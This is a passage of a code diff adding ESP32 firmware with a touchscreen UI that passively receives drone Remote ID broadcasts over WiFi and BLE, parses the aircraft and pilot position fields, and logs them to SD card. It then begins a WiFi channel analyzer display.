+        case 7: return "Kite";      case 8: return "Free Balloon";case 9: return "Captive Balloon";
+        case 10:return "Airship";   case 11:return "Free Fall";   case 12:return "Rocket";
+        case 13:return "Tethered";  case 14:return "Obstacle";    case 15:return "Other";
+        default:return "Unknown";
+    }
+}
+
+// Find existing record by MAC or create a new one. Returns NULL if table full.
+static drone_rec_t *drone_find_or_create(const uint8_t *mac)
+{
+    portENTER_CRITICAL(&g_drone_mux);
+    for (int i = 0; i < g_drone_count; i++) {
+        if (memcmp(g_drones[i].mac, mac, 6) == 0) {
+            portEXIT_CRITICAL(&g_drone_mux);
+            return &g_drones[i];
+        }
+    }
+    if (g_drone_count >= DRONE_MAX) { portEXIT_CRITICAL(&g_drone_mux); return NULL; }
+    drone_rec_t *r = &g_drones[g_drone_count++];
+    memset(r, 0, sizeof(*r));
+    memcpy(r->mac, mac, 6);
+    r->first_seen = (uint32_t)(esp_timer_get_time() / 1000000);
+    portEXIT_CRITICAL(&g_drone_mux);
+    return r;
+}
+
+// Parse one 25-byte ASTM F3411-22a message into a drone_rec_t.
+static void drone_parse_rid(drone_rec_t *rec, const uint8_t *msg, int len)
+{
+    if (len < 1) return;
+    uint8_t mtype = (msg[0] >> 4) & 0x0F;
+
+    if (mtype == RID_MSG_BASIC && len >= 22) {
+        rec->id_type = (msg[1] >> 4) & 0x0F;
+        rec->ua_type = msg[1] & 0x0F;
+        memcpy(rec->uas_id, msg + 2, 20);
+        rec->uas_id[20] = '\0';
+        for (int i = 19; i >= 0 && (rec->uas_id[i] == '\0' || rec->uas_id[i] == ' '); i--)
+            rec->uas_id[i] = '\0';
+    }
+    else if (mtype == RID_MSG_LOC && len >= 25) {
+        uint8_t  status = msg[1];
+        uint8_t  dir    = msg[2];
+        uint8_t  smult  = msg[3] & 0x01;
+        uint8_t  spd    = msg[4];
+        int8_t   vspd   = (int8_t)msg[5];
+        int32_t  lat32  = (int32_t)((uint32_t)msg[6] |(uint32_t)msg[7]<<8 |(uint32_t)msg[8]<<16 |(uint32_t)msg[9]<<24);
+        int32_t  lon32  = (int32_t)((uint32_t)msg[10]|(uint32_t)msg[11]<<8|(uint32_t)msg[12]<<16|(uint32_t)msg[13]<<24);
+        uint16_t baroe  = (uint16_t)(msg[14] | (msg[15]<<8));
+        uint16_t geoe   = (uint16_t)(msg[16] | (msg[17]<<8));
+        uint16_t hdg    = dir; if (status & 0x10) hdg += 180; if (hdg > 359) hdg = 359;
+        rec->heading    = hdg;
+        rec->lat        = lat32 * 1e-7;
+        rec->lon        = lon32 * 1e-7;
+        rec->alt_baro   = (baroe != 0xFFFF) ? (baroe * 0.5f - 1000.0f) : -1000.0f;
+        rec->alt_geo    = (geoe  != 0xFFFF) ? (geoe  * 0.5f - 1000.0f) : -1000.0f;
+        rec->speed      = smult ? (spd * 0.75f) : (spd * 0.25f);
+        rec->vert_speed = vspd * 0.5f;
+        rec->has_loc    = (lat32 != 0 || lon32 != 0);
+    }
+    else if (mtype == RID_MSG_SYS && len >= 10) {
+        int32_t plat = (int32_t)((uint32_t)msg[2]|(uint32_t)msg[3]<<8|(uint32_t)msg[4]<<16|(uint32_t)msg[5]<<24);
+        int32_t plon = (int32_t)((uint32_t)msg[6]|(uint32_t)msg[7]<<8|(uint32_t)msg[8]<<16|(uint32_t)msg[9]<<24);
+        rec->pilot_lat = plat * 1e-7;
+        rec->pilot_lon = plon * 1e-7;
+        rec->has_sys   = (plat != 0 || plon != 0);
+    }
+    else if (mtype == RID_MSG_SELFID && len >= 24) {
+        memcpy(rec->self_id, msg + 2, 22); rec->self_id[22] = '\0';
+    }
+    else if (mtype == RID_MSG_OPID && len >= 22) {
+        memcpy(rec->op_id, msg + 2, 20); rec->op_id[20] = '\0';
+    }
+    else if (mtype == RID_MSG_PACK && len >= 3) {
+        uint8_t qty = msg[1];
+        for (int i = 0; i < qty && (3 + (i+1)*25) <= len; i++)
+            drone_parse_rid(rec, msg + 3 + i*25, 25);
+    }
+}
+
+// Append one CSV row to the open drone_csv file.
+static void drone_log_csv(drone_rec_t *rec)
+{
+    if (!drone_csv || !sd_spi_mutex) return;
+    if (xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(500)) != pdTRUE) return;
+    char ms[18];
+    snprintf(ms, sizeof(ms), "%02X:%02X:%02X:%02X:%02X:%02X",
+             rec->mac[5],rec->mac[4],rec->mac[3],rec->mac[2],rec->mac[1],rec->mac[0]);
+    fprintf(drone_csv,
+        "%lu,%s,%d,%s,\"%s\",%d,%d,%.7f,%.7f,%.1f,%.1f,%.2f,%d,%.2f,%.7f,%.7f,\"%s\",\"%s\",%lu\n",
+        (unsigned long)rec->last_seen,
+        rec->source == RID_SRC_BLE ? "BLE" : "WiFi",
+        rec->rssi, ms,
+        rec->uas_id, rec->id_type, rec->ua_type,
+        rec->lat, rec->lon, rec->alt_geo, rec->alt_baro,
+        rec->speed, rec->heading, rec->vert_speed,
+        rec->pilot_lat, rec->pilot_lon,
+        rec->self_id, rec->op_id,
+        (unsigned long)rec->pkt_count);
+    fflush(drone_csv);
+    xSemaphoreGive(sd_spi_mutex);
+}
+
+// Flush all records to CSV.
+static void drone_flush_csv(void)
+{
+    portENTER_CRITICAL(&g_drone_mux);
+    int cnt = g_drone_count;
+    portEXIT_CRITICAL(&g_drone_mux);
+    for (int i = 0; i < cnt; i++)
+        if (g_drones[i].pkt_count > 0) drone_log_csv(&g_drones[i]);
+}
+
+// Drain BLE PCAP queue → drone_pcap_file.
+static void drone_drain_pcap(void)
+{
+    if (!drone_pcap_queue || !drone_pcap_file || !sd_spi_mutex) return;
+    if (xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(300)) != pdTRUE) return;
+    ble_pcap_pkt_t pkt;
+    while (xQueueReceive(drone_pcap_queue, &pkt, 0) == pdTRUE) {
+        ble_pcap_write_epb(drone_pcap_file, &pkt);
+        drone_pcap_pkt_count++;
+    }
+    fflush(drone_pcap_file);
+    xSemaphoreGive(sd_spi_mutex);
+}
+
+// BLE GAP callback: filter company ID 0x0E00 (OpenDroneID) advertisements.
+static int drone_ble_gap_cb(struct ble_gap_event *event, void *arg)
+{
+    (void)arg;
+    if (!drone_scan_active) return 0;
+    if (event->type != BLE_GAP_EVENT_DISC) return 0;
+    struct ble_gap_disc_desc *desc = &event->disc;
+    struct ble_hs_adv_fields fields;
+    if (ble_hs_adv_parse_fields(&fields, desc->data, desc->length_data) != 0) return 0;
+    if (!fields.mfg_data || fields.mfg_data_len < 5) return 0;
+    // Company ID 0x0E00 (LE: 0x00 0x0E), AD application code 0x0D
+    if (fields.mfg_data[0] != 0x00 || fields.mfg_data[1] != 0x0E) return 0;
+    if (fields.mfg_data[2] != 0x0D) return 0;
+
+    drone_rec_t *rec = drone_find_or_create(desc->addr.val);
+    if (!rec) return 0;
+    rec->rssi      = desc->rssi;
+    rec->source    = RID_SRC_BLE;
+    rec->last_seen = (uint32_t)(esp_timer_get_time() / 1000000);
+    rec->pkt_count++;
+    // Byte 3 = counter, byte 4+ = 25-byte RID message
+    if (fields.mfg_data_len >= 5)
+        drone_parse_rid(rec, fields.mfg_data + 4, fields.mfg_data_len - 4);
+
+    // Queue raw advertisement for PCAP
+    if (drone_pcap_queue) {
+        ble_pcap_pkt_t pkt;
+        memcpy(pkt.addr, desc->addr.val, 6);
+        pkt.addr_type    = desc->addr.type;
+        pkt.event_type   = (uint8_t)desc->event_type;
+        pkt.rssi         = desc->rssi;
+        pkt.data_len     = desc->length_data < 31 ? desc->length_data : 31;
+        memcpy(pkt.data, desc->data, pkt.data_len);
+        pkt.timestamp_us = (uint64_t)esp_timer_get_time();
+        xQueueSend(drone_pcap_queue, &pkt, 0);
+    }
+    drone_update_flag = true;
+    return 0;
+}
+
+// WiFi promiscuous callback: parse Remote ID from NAN action frames and beacon vendor IEs.
+// NAN SDF: mgmt action, cat 0x04, OUI 50:6F:9A:13, then look for RID service hash.
+// Beacon/Probe: vendor IE tag 0xDD, OUI FA:0B:BC, type 0x0D.
+static void drone_wifi_cb(void *buf, wifi_promiscuous_pkt_type_t type)
+{
+    if (!drone_scan_active) return;
+    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *frame = pkt->payload;
+    int len = (int)pkt->rx_ctrl.sig_len;
+    if (len < 24) return;
+
+    uint8_t ftype    = (frame[0] >> 2) & 0x03;
+    uint8_t fsubtype = (frame[0] >> 4) & 0x0F;
+    if (ftype != 0x00) return;  // management frames only
+
+    const uint8_t *src_mac = frame + 10;   // SA offset
+    const uint8_t *body    = frame + 24;
+    int            blen    = len - 24;
+
+    if (fsubtype == 0x0D && blen >= 5) {
+        // Action frame: NAN SDF signature — category 0x04, OUI 50:6F:9A, type 0x13
+        if (body[0] == 0x04 && body[1] == 0x50 && body[2] == 0x6F &&
+            body[3] == 0x9A && body[4] == 0x13) {
+            // Scan for Remote ID service name hash within the NAN body
+            static const uint8_t rid_svc_hash[6] = {0xD0, 0x4F, 0x22, 0xA4, 0xEC, 0xD1};
+            for (int i = 5; i <= blen - 31; i++) {
+                if (memcmp(body + i, rid_svc_hash, 6) == 0) {
+                    const uint8_t *rid = body + i + 6;
+                    int rlen = blen - (i + 6);
+                    drone_rec_t *rec = drone_find_or_create(src_mac);
+                    if (rec) {
+                        rec->rssi      = pkt->rx_ctrl.rssi;
+                        rec->source    = RID_SRC_WIFI;
+                        rec->last_seen = (uint32_t)(esp_timer_get_time() / 1000000);
+                        rec->pkt_count++;
+                        drone_parse_rid(rec, rid, rlen < 25 ? rlen : 25);
+                        drone_update_flag = true;
+                    }
+                    return;
+                }
+            }
+        }
+    }
+    else if ((fsubtype == 0x08 || fsubtype == 0x05) && blen >= 12) {
+        // Beacon (0x08) or Probe Response (0x05) — scan IEs after 12-byte fixed fields
+        const uint8_t *ie = body + 12;
+        int ie_rem = blen - 12;
+        while (ie_rem >= 2) {
+            uint8_t tag  = ie[0];
+            uint8_t tlen = ie[1];
+            if (2 + tlen > ie_rem) break;
+            // Vendor IE (0xDD) with OUI FA:0B:BC, type 0x0D = OpenDroneID
+            if (tag == 0xDD && tlen >= 29 &&
+                ie[2] == 0xFA && ie[3] == 0x0B && ie[4] == 0xBC && ie[5] == 0x0D) {
+                drone_rec_t *rec = drone_find_or_create(src_mac);
+                if (rec) {
+                    rec->rssi      = pkt->rx_ctrl.rssi;
+                    rec->source    = RID_SRC_WIFI;
+                    rec->last_seen = (uint32_t)(esp_timer_get_time() / 1000000);
+                    rec->pkt_count++;
+                    int rlen = tlen - 4;
+                    drone_parse_rid(rec, ie + 6, rlen < 25 ? rlen : 25);
+                    drone_update_flag = true;
+                }
+                return;
+            }
+            ie += 2 + tlen;
+            ie_rem -= 2 + tlen;
+        }
+    }
+}
+
+// Channel sequence for WiFi phase — extra weight on ch 6 (NAN)
+static const int s_drone_wifi_channels[] = {6, 6, 1, 6, 6, 11, 6, 6};
+#define DRONE_WIFI_CH_COUNT (int)(sizeof(s_drone_wifi_channels)/sizeof(s_drone_wifi_channels[0]))
+
+// Main drone detector task: alternates WiFi promiscuous and BLE scan phases.
+static void drone_task(void *pvParameters)
+{
+    (void)pvParameters;
+    ESP_LOGI(TAG, "Drone Detector task started");
+    int ch_idx = 0;
+
+    while (drone_scan_active) {
+        // ── WiFi phase ───────────────────────────────────────────────────
+        drone_phase_ble   = false;
+        drone_update_flag = true;   // refresh status label
+        if (!ensure_wifi_mode()) { vTaskDelay(pdMS_TO_TICKS(1000)); continue; }
+
+        wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+        esp_wifi_set_promiscuous_filter(&filt);
+        esp_wifi_set_promiscuous_rx_cb(drone_wifi_cb);
+        esp_wifi_set_promiscuous(true);
+
+        int64_t wifi_end = esp_timer_get_time() / 1000 + DRONE_WIFI_PHASE_MS;
+        while (drone_scan_active && esp_timer_get_time() / 1000 < wifi_end) {
+            int ch = s_drone_wifi_channels[ch_idx % DRONE_WIFI_CH_COUNT];
+            ch_idx++;
+            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+            vTaskDelay(pdMS_TO_TICKS(500));
+        }
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_set_promiscuous_rx_cb(NULL);
+        if (!drone_scan_active) break;
+
+        drone_flush_csv();
+
+        // ── BLE phase ────────────────────────────────────────────────────
+        drone_phase_ble   = true;
+        drone_update_flag = true;
+        if (!ensure_ble_mode()) { vTaskDelay(pdMS_TO_TICKS(1000)); continue; }
+
+        struct ble_gap_disc_params bp = {
+            .itvl = 0x60, .window = 0x60,
+            .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
+            .limited = 0, .passive = 0, .filter_duplicates = 0
+        };
+        int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &bp, drone_ble_gap_cb, NULL);
+
+        int64_t ble_end = esp_timer_get_time() / 1000 + DRONE_BLE_PHASE_MS;
+        while (drone_scan_active && esp_timer_get_time() / 1000 < ble_end)
+            vTaskDelay(pdMS_TO_TICKS(100));
+
+        if (rc == 0) ble_gap_disc_cancel();
+        drone_drain_pcap();
+        drone_flush_csv();
+    }
+
+    // Shutdown
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    if (current_radio_mode == RADIO_MODE_BLE) {
+        ble_gap_disc_cancel();
+        bt_nimble_deinit();
+        current_radio_mode = RADIO_MODE_NONE;
+    }
+    drone_drain_pcap();
+    if (drone_pcap_queue) { vQueueDelete(drone_pcap_queue); drone_pcap_queue = NULL; }
+    if (drone_pcap_file && sd_spi_mutex &&
+        xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
+        fflush(drone_pcap_file); fclose(drone_pcap_file); drone_pcap_file = NULL;
+        xSemaphoreGive(sd_spi_mutex);
+    }
+    drone_flush_csv();
+    if (drone_csv && sd_spi_mutex &&
+        xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
+        fflush(drone_csv); fclose(drone_csv); drone_csv = NULL;
+        xSemaphoreGive(sd_spi_mutex);
+    }
+    ESP_LOGI(TAG, "Drone Detector ended — %d drone(s) logged", g_drone_count);
+    drone_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+// Exit callback — stops task, closes files, returns to WiFi menu.
+static void drone_exit_cb(lv_event_t *e)
+{
+    (void)e;
+    drone_scan_active = false;
+    drone_ui_active   = false;
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    if (current_radio_mode == RADIO_MODE_BLE) ble_gap_disc_cancel();
+    for (int i = 0; i < 35 && drone_task_handle != NULL; i++)
+        vTaskDelay(pdMS_TO_TICKS(100));
+    if (drone_task_stack) { heap_caps_free(drone_task_stack); drone_task_stack = NULL; }
+    if (drone_pcap_queue) { vQueueDelete(drone_pcap_queue); drone_pcap_queue = NULL; }
+    show_wifi_menu_screen();
+}
+
+// Detail view — scrollable parsed fields for one drone record.
+static void drone_detail_back_cb(lv_event_t *e) { (void)e; show_drone_detector_screen(); }
+
+static void drone_row_tap_cb(lv_event_t *e)
+{
+    drone_show_detail((int)(intptr_t)lv_event_get_user_data(e));
+}
+
+static void drone_show_detail(int idx)
+{
+    if (idx < 0 || idx >= g_drone_count) return;
+    drone_rec_t r;
+    portENTER_CRITICAL(&g_drone_mux);
+    r = g_drones[idx];
+    portEXIT_CRITICAL(&g_drone_mux);
+
+    create_function_page_base("Drone Detail");
+
+    lv_obj_t *cont = lv_obj_create(function_page);
+    lv_obj_set_size(cont, lv_pct(100), LCD_V_RES - 30 - 44);
+    lv_obj_align(cont, LV_ALIGN_TOP_MID, 0, 30);
+    lv_obj_set_style_bg_opa(cont, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(cont, 0, 0);
+    lv_obj_set_style_pad_all(cont, 6, 0);
+    lv_obj_set_flex_flow(cont, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(cont, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+    lv_obj_set_style_pad_gap(cont, 2, 0);
+    lv_obj_set_scrollbar_mode(cont, LV_SCROLLBAR_MODE_AUTO);
+
+    char ms[18], buf[120];
+    snprintf(ms, sizeof(ms), "%02X:%02X:%02X:%02X:%02X:%02X",
+             r.mac[5],r.mac[4],r.mac[3],r.mac[2],r.mac[1],r.mac[0]);
+
+    #define DR(fmt,...) do { \
+        snprintf(buf, sizeof(buf), fmt, ##__VA_ARGS__); \
+        lv_obj_t *_l = lv_label_create(cont); \
+        lv_label_set_text(_l, buf); \
+        lv_obj_set_style_text_font(_l, &lv_font_montserrat_12, 0); \
+        lv_obj_set_style_text_color(_l, ui_text_color(), 0); \
+        lv_obj_set_width(_l, lv_pct(100)); \
+        lv_label_set_long_mode(_l, LV_LABEL_LONG_WRAP); \
+    } while(0)
+
+    DR("MAC: %s", ms);
+    DR("Source: %s  RSSI: %d dBm  Pkts: %lu",
+       r.source == RID_SRC_BLE ? "BLE" : "WiFi", r.rssi, (unsigned long)r.pkt_count);
+    DR("UAS ID: %s", r.uas_id[0] ? r.uas_id : "(none)");
+    DR("ID Type: %d  Aircraft: %s", r.id_type, drone_ua_str(r.ua_type));
+    if (r.has_loc) {
+        DR("Lat: %.6f  Lon: %.6f", r.lat, r.lon);
+        DR("Alt Geo: %.1f m  Baro: %.1f m", r.alt_geo, r.alt_baro);
+        DR("Speed: %.1f m/s  Vert: %+.1f m/s", r.speed, r.vert_speed);
+        DR("Heading: %d deg", r.heading);
+    } else {
+        DR("Position: not reported");
+    }
+    if (r.has_sys)  DR("Pilot: %.6f, %.6f", r.pilot_lat, r.pilot_lon);
+    if (r.self_id[0]) DR("Desc: %s", r.self_id);
+    if (r.op_id[0])   DR("OpID: %s", r.op_id);
+    #undef DR
+
+    lv_obj_t *bb = lv_btn_create(function_page);
+    lv_obj_set_size(bb, 110, 28);
+    lv_obj_align(bb, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(bb, lv_color_make(60,60,60), LV_STATE_DEFAULT);
+    lv_obj_set_style_border_width(bb, 0, 0);
+    lv_obj_set_style_radius(bb, 8, 0);
+    lv_obj_t *bbl = lv_label_create(bb);
+    lv_label_set_text(bbl, LV_SYMBOL_LEFT " Back");
+    lv_obj_set_style_text_font(bbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(bbl, lv_color_white(), 0);
+    lv_obj_center(bbl);
+    lv_obj_add_event_cb(bb, drone_detail_back_cb, LV_EVENT_CLICKED, NULL);
+}
+
+// Main screen builder. Safe to call both for fresh start and from detail-view back.
+static void show_drone_detector_screen(void)
+{
+    bool fresh = !drone_scan_active;
+    if (fresh) {
+        portENTER_CRITICAL(&g_drone_mux);
+        g_drone_count = 0;
+        memset(g_drones, 0, sizeof(g_drones));
+        portEXIT_CRITICAL(&g_drone_mux);
+        drone_pcap_pkt_count = 0;
+    }
+
+    create_function_page_base("Drone Detector");
+    drone_ui_active = true;
+
+    drone_status_lbl = lv_label_create(function_page);
+    lv_label_set_text(drone_status_lbl, LV_SYMBOL_WIFI "  Initializing scan...");
+    lv_obj_set_style_text_font(drone_status_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(drone_status_lbl, lv_color_hex(0x66BB6A), 0);
+    lv_obj_align(drone_status_lbl, LV_ALIGN_TOP_MID, 0, 34);
+
+    drone_count_lbl = lv_label_create(function_page);
+    lv_label_set_text(drone_count_lbl, "Drones detected: 0");
+    lv_obj_set_style_text_font(drone_count_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(drone_count_lbl, ui_text_color(), 0);
+    lv_obj_align(drone_count_lbl, LV_ALIGN_TOP_MID, 0, 54);
+
+    drone_list = lv_list_create(function_page);
+    lv_obj_set_size(drone_list, lv_pct(100), LCD_V_RES - 30 - 100);
+    lv_obj_align(drone_list, LV_ALIGN_TOP_MID, 0, 72);
+    lv_obj_set_style_bg_color(drone_list, ui_bg_color(), 0);
+    lv_obj_set_style_border_width(drone_list, 0, LV_PART_ITEMS);
+
+    lv_obj_t *emp = lv_label_create(drone_list);
+    lv_label_set_text(emp, "Scanning... no Remote ID detected yet");
+    lv_obj_set_style_text_font(emp, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(emp, lv_color_make(120,120,120), 0);
+
+    drone_rec_lbl = lv_label_create(function_page);
+    lv_label_set_text(drone_rec_lbl, LV_SYMBOL_SD_CARD " Opening SD...");
+    lv_obj_set_style_text_font(drone_rec_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(drone_rec_lbl, lv_color_make(150,150,150), 0);
+    lv_obj_set_style_text_align(drone_rec_lbl, LV_TEXT_ALIGN_CENTER, 0);
+    lv_obj_set_width(drone_rec_lbl, lv_pct(100));
+    lv_obj_align(drone_rec_lbl, LV_ALIGN_BOTTOM_MID, 0, -42);
+
+    lv_obj_t *exit_btn = lv_btn_create(function_page);
+    lv_obj_set_size(exit_btn, 110, 28);
+    lv_obj_align(exit_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(exit_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(COLOR_MATERIAL_RED,50), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(exit_btn, 0, 0);
+    lv_obj_set_style_radius(exit_btn, 8, 0);
+    lv_obj_set_flex_flow(exit_btn, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(exit_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(exit_btn, 4, 0);
+    lv_obj_t *eico = lv_label_create(exit_btn);
+    lv_label_set_text(eico, LV_SYMBOL_CLOSE);
+    lv_obj_set_style_text_font(eico, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(eico, lv_color_white(), 0);
+    lv_obj_t *etxt = lv_label_create(exit_btn);
+    lv_label_set_text(etxt, "Exit");
+    lv_obj_set_style_text_font(etxt, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(etxt, lv_color_white(), 0);
+    lv_obj_add_event_cb(exit_btn, drone_exit_cb, LV_EVENT_CLICKED, NULL);
+
+    if (!fresh) {
+        // Returning from detail view — trigger UI refresh from existing data
+        drone_update_flag = true;
+        return;
+    }
+
+    // Fresh start: open SD logging files
+    drone_scan_active = true;
+    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
+        struct stat st = {0};
+        if (stat(DRONE_DETECT_DIR, &st) == -1) {
+            mkdir("/sdcard/lab", 0777);
+            mkdir(DRONE_DETECT_DIR, 0777);
+        }
+        uint64_t ts = esp_timer_get_time() / 1000;
+        snprintf(drone_csv_path,  sizeof(drone_csv_path),
+                 DRONE_DETECT_DIR "/drone_%llu.csv",    (unsigned long long)ts);
+        snprintf(drone_pcap_path, sizeof(drone_pcap_path),
+                 DRONE_DETECT_DIR "/drone_%llu.pcapng", (unsigned long long)ts);
+
+        drone_csv = fopen(drone_csv_path, "w");
+        if (drone_csv) {
+            fprintf(drone_csv,
+                "timestamp_s,source,rssi,mac,uas_id,id_type,ua_type,"
+                "lat,lon,alt_geo,alt_baro,speed,heading,vert_speed,"
+                "pilot_lat,pilot_lon,self_id,op_id,pkt_count\n");
+            fflush(drone_csv);
+        }
+        drone_pcap_file = fopen(drone_pcap_path, "wb");
+        if (drone_pcap_file) {
+            ble_pcap_write_shb(drone_pcap_file);
+            ble_pcap_write_idb(drone_pcap_file);
+            fflush(drone_pcap_file);
+        }
+        xSemaphoreGive(sd_spi_mutex);
+    }
+    if (drone_rec_lbl && lv_obj_is_valid(drone_rec_lbl)) {
+        if (drone_csv) {
+            const char *fn = strrchr(drone_csv_path, '/');
+            char rb[96];
+            snprintf(rb, sizeof(rb), LV_SYMBOL_SD_CARD " %s", fn ? fn+1 : drone_csv_path);
+            lv_label_set_text(drone_rec_lbl, rb);
+            lv_obj_set_style_text_color(drone_rec_lbl, COLOR_MATERIAL_RED, 0);
+        } else {
+            lv_label_set_text(drone_rec_lbl, LV_SYMBOL_SD_CARD " SD unavailable");
+        }
+    }
+
+    // Launch task with PSRAM stack
+    drone_pcap_queue = xQueueCreate(64, sizeof(ble_pcap_pkt_t));
+    drone_task_stack = (StackType_t *)heap_caps_malloc(6144 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    if (drone_task_stack) {
+        drone_task_handle = xTaskCreateStatic(
+            drone_task, "drone_det", 6144, NULL, 5,
+            drone_task_stack, &drone_task_buf);
+    } else {
+        ESP_LOGE(TAG, "Drone detector: failed to allocate task stack");
+        drone_scan_active = false;
+    }
+}
+
+// ============================================================================
+// SCOPE VISUALIZERS — WiFi Channel Analyzer · WiFi Band Scope · BLE Band Scope
+// ============================================================================
+
+// ── Shared: SDR rainbow heat-map (0=black, 64=blue, 128=cyan, 192=yellow, 255=red)
+static lv_color_t scope_heat_color(uint8_t v) {
+    uint8_t r, g, b;
+    if      (v <  64) { r = 0;           g = 0;               b = (uint8_t)(v * 4);        }
+    else if (v < 128) { r = 0;           g = (uint8_t)((v-64)*4);  b = 255;                }
+    else if (v < 192) { r = (uint8_t)((v-128)*4); g = 255;    b = (uint8_t)(255-(v-128)*4); }
+    else              { r = 255;         g = (uint8_t)(255-(v-192)*4); b = 0;               }
+    return lv_color_make(r, g, b);
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// WIFI CHANALIZER
+// Two-phase UI: (1) SSID picker with top-5 pre-selected, color-coded;
+// (2) Gaussian bell-curve chart showing only selected SSIDs in their colors.
+// Pixel rendering via LV_EVENT_DRAW_MAIN: PSRAM buffer → LVGL DRAM draw buffer.
+// ────────────────────────────────────────────────────────────────────────────
+
+// Forward declarations for the two-phase nav
+static void show_wana_select_screen(void);
+static void show_wana_chart_screen(void);
+
+static float wana_ch_to_mhz(uint8_t ch) {
+    if (ch == 14) return 2484.0f;
+    if (ch <  14) return 2407.0f + ch * 5.0f;
+    static const struct { uint8_t c; float f; } t[] = {
+        {36,5180},{40,5200},{44,5220},{48,5240},{52,5260},{56,5280},{60,5300},{64,5320},
+        {100,5500},{104,5520},{108,5540},{112,5560},{116,5580},{120,5600},{124,5620},
+        {128,5640},{132,5660},{136,5680},{140,5700},{144,5720},
+        {149,5745},{153,5765},{157,5785},{161,5805},{165,5825}
+    };
+    for (int i = 0; i < 25; i++) if (t[i].c == ch) return t[i].f;
+    return 5180.0f;
+}
+
+// 8-color palette for SSID groups, used consistently in picker + chart
+static lv_color_t wana_grp_color(uint8_t idx) {
+    static const uint32_t pal[8] = {
+        0x00C8FF, 0xFF7830, 0x64FF64, 0xFF50B4,
+        0xFFDC00, 0xB464FF, 0xFF4646, 0x32FFC8,
+    };
+    return lv_color_hex(pal[idx & 7]);
+}
+
+static void wana_clear_ssid_labels(void) {
+    for (int i = 0; i < wana_lbl_count; i++) {
+        if (wana_ssid_lbls[i] && lv_obj_is_valid(wana_ssid_lbls[i]))
+            lv_obj_del(wana_ssid_lbls[i]);
+        wana_ssid_lbls[i] = NULL;
+    }
+    wana_lbl_count = 0;
+}
+
+// Group wana_aps[] by SSID, sort by strongest signal, pre-select top 5.
+static int wana_ssid_cmp_rssi(const void *a, const void *b) {
+    return (int)((const wana_ssid_group_t*)b)->max_rssi -
+           (int)((const wana_ssid_group_t*)a)->max_rssi;
+}
+static void wana_group_ssids(void) {
+    wana_ssid_count = 0;
+    for (int i = 0; i < wana_ap_count; i++) {
+        const char *ssid = (char*)wana_aps[i].ssid;
+        if (ssid[0] == '\0') continue;
+        int g = -1;
+        for (int j = 0; j < wana_ssid_count; j++) {
+            if (strncmp(wana_ssids[j].ssid, ssid, 32) == 0) { g = j; break; }
+        }
+        if (g < 0 && wana_ssid_count < WANA_MAX_SSIDS) {
+            g = wana_ssid_count++;
+            strncpy(wana_ssids[g].ssid, ssid, 32);
+            wana_ssids[g].ssid[32] = '\0';
+            wana_ssids[g].max_rssi = -127;
+            wana_ssids[g].ap_count = 0;
+            wana_ssids[g].selected = false;
+        }
+        if (g >= 0 && wana_ssids[g].ap_count < 8) {
+            wana_ssids[g].ap_indices[wana_ssids[g].ap_count++] = (uint8_t)i;
+            if (wana_aps[i].rssi > wana_ssids[g].max_rssi)
+                wana_ssids[g].max_rssi = wana_aps[i].rssi;
+        }
+    }
+    qsort(wana_ssids, wana_ssid_count, sizeof(wana_ssid_group_t), wana_ssid_cmp_rssi);
+    for (int i = 0; i < wana_ssid_count; i++) {
+        wana_ssids[i].color_idx = (uint8_t)(i % 8);
+        wana_ssids[i].selected  = (i < 5);
+    }
+}
+
+// Render both bands into the wide PSRAM buffer (WANA_WIDE_W × WANA_CHART_H).
+// Portrait orientation: x = frequency (left=low, right=high), y = signal (0=top=strong).
+// Bell curves are bottom-anchored: strong signals reach up toward y=0.
+static void wana_draw_wide(void)
+{
+    lv_color_t *buf  = wana_buf;
+    lv_color_t  bg   = lv_color_make(8, 8, 22);
+    lv_color_t  grid = lv_color_make(35, 35, 65);
+    lv_color_t  sep  = lv_color_make(40, 40, 80);
+
+    for (int i = 0; i < WANA_WIDE_W * WANA_CHART_H; i++) buf[i] = bg;
+
+    // Band header strips at y=0..1 (top edge)
+    for (int x = WANA_2G_X; x < WANA_2G_X + WANA_2G_W; x++) {
+        buf[0 * WANA_WIDE_W + x] = lv_color_hex(0x4FC3F7);
+        buf[1 * WANA_WIDE_W + x] = lv_color_hex(0x1A6080);
